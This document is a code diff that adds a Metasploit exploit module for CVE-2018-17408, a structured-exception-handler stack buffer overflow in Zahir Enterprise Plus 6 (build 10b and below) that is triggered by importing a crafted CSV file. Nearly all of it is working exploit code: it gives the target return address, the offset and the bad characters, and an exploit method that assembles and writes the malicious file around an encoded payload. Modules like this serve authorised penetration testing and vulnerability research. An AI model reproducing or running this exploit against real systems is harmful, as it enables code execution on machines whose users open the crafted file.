@@ -1,0 +1,66 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::Seh
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Zahir Enterprise Plus 6 Stack Buffer Overflow",
+      'Description'    => %q{
+       This module exploits a stack buffer overflow in Zahir Enterprise Plus version 6 build 10b and below.
+       The vulnerability is triggered when opening a CSV file containing CR/LF and overly long string characters
+       via Import from other File. This results in overwriting a structured exception handler record.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'f3ci',       # initial discovery
+          'modpr0be'    # poc and Metasploit Module
+        ],
+      'References'      =>
+        [
+          [ 'CVE', '2018-17408' ],
+          [ 'EDB', '45505' ]
+        ],
+      'Platform'        => 'win',
+      'Targets'         =>
+        [
+          ['Zahir Enterprise Plus 6 <= build 10b',
+            {
+              #P/P/R from vclie100.bpl (C:\Program Files\Zahir Personal 6 - Demo Version\vclie100.bpl)
+              'Ret'     => 0x52016661,
+              'Offset'  => 3041
+            }
+          ]
+        ],
+      'Payload'         =>
+        {
+          'Space'       => 5000,
+          'BadChars'    => "\x00\x0a\x0d\x22\x2c",
+          'DisableNops'     => true
+        },
+      'DisclosureDate'  => 'Sep 28 2018',
+      'DefaultTarget'   => 0))
+
+    register_options(
+    [
+      OptString.new('FILENAME', [true, 'The malicious file name', 'msf.csv'])
+    ])
+  end
+
+  def exploit
+    buf = rand_text_alpha_upper(target['Offset'])
+    buf << "\r\n"   # crash chars
+    buf << rand_text_alpha_upper(380) # extra chars to hit the offset
+    buf << generate_seh_record(target.ret)
+    buf << payload.encoded
+
+    file_create(buf)
+  end
+end
